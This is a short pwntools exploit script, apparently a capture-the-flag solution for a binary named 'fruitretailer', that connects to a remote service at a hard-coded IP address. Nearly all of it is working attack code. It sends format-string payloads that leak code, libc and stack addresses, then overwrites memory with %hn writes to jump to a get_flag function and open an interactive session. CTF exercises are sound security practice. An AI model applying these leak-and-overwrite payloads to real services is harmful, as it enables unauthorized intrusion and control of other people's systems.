from pwn import *

def buy(p,q,c,addr):
	r.sendline('1')
	r.recvuntil("?:")
	r.sendline(str(p))
	r.recvuntil("quantity:")
	r.sendline(q)
	r.recvuntil("(Y/N)")
	r.sendline(c)
	r.sendline(addr)
	r.recvuntil("choice:")
def create():
	r.sendline('2')
	return r.recvuntil("choice:")
def change_label(idx,label):
	r.sendline('3')
	r.recvuntil("change:")
	r.sendline(str(idx))
	r.recvuntil("label:")
	r.send(label)
	r.recvuntil("choice:")
	
#r = process("./fruitretailer")
r = remote("125.235.240.167", 5000)

r.recvuntil("choice:")
payload = 'A'*64 + '%9$p-%13$p-%6$p-'
buy(2,'1'*11,'Y',payload)
change_label(1,'A'*10)
msg = create().split("\n")[2].split("|")[6].split('-')

codebase = int(msg[0],16)-0x14b0
libc = int(msg[1],16)-0x20830
stack = int(msg[2],16)+8
get_flag = codebase + 0xC92
log.info("code base: %#x",codebase)
log.info("libc base: %#x",libc)
log.info("stack: %#x",stack)

payload = 'A'*64 + '%'+str(stack&0xffff)+'x%6$hn'
buy(2,'1'*11,'Y',payload)
change_label(2,'A'*10)
create()

payload = 'A'*64 + '%'+str(get_flag&0xffff)+'x%8$hn'
buy(2,'1'*11,'Y',payload)
change_label(3,'A'*10)
r.sendline('2')
print r.recv()
r.interactive()
